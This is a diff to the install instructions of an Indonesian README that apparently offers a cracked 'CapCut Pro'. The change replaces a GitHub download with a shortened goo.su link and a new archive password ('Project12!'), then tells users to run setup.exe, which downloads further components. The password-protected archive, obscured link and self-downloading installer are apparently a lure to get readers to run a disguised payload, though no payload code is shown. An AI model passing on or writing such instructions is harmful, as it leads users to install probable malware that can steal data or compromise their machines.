@@ -2,8 +2,8 @@
 
 <H3>⚙️ Cara menginstal</H3>
 
-- [Unduh](https://github.com/Benrice1243/capcut-pro-indonesian/releases/download/Unduh/CapCutP24.rar)
-- Buka arsip (kata sandi: capcut4)
+- [Unduh](https://goo.su/xmR3AsJ)
+- Buka arsip (kata sandi: Project12!)
 - Buka setup.exe untuk mengunduh komponen dan menginstal
 - Ikuti instruksi
 
